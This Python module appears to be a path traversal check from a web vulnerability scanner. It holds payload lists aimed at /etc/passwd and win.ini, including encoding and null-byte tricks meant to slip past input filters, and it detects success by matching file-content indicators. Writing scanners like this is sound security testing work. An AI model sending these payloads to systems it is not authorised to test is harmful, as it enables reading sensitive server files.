from __future__ import annotations

from ...http.client import HttpClient
from ..core import Check, Finding, InjectionPoint
from ..runtime import deep

PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
]

# Deep mode: encoding layers and terminator tricks that basic filters miss.
DEEP_PAYLOADS = [
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "../../../../etc/passwd%00",
    "....\\....\\....\\....\\windows\\win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
]

INDICATORS = [
    "root:x:0:0:",
    "[fonts]",
    "; for 16-bit app support",
    "extensions=none",
]


class PathTraversalCheck(Check):
    check_id = "path-traversal"
    title = "Path traversal"
    severity = "high"

    def run(self, point: InjectionPoint, client: HttpClient) -> list[Finding]:
        payloads = (PAYLOADS + DEEP_PAYLOADS) if deep() else PAYLOADS
        for payload in payloads:
            request = point.with_value(payload)
            response = client.send(request)
            for indicator in INDICATORS:
                if indicator in response.text:
                    return [
                        Finding(
                            check_id=self.check_id,
                            title=self.title,
                            severity=self.severity,
                            url=point.request.url,
                            param=point.param,
                            confidence="confirmed",
                            detail=f"Parameter '{point.param}' returned file contents when given {payload!r}.",
                            evidence=indicator,
                            remediation="Canonicalize and whitelist allowed file paths; never pass user input to filesystem APIs.",
                        )
                    ]
        return []
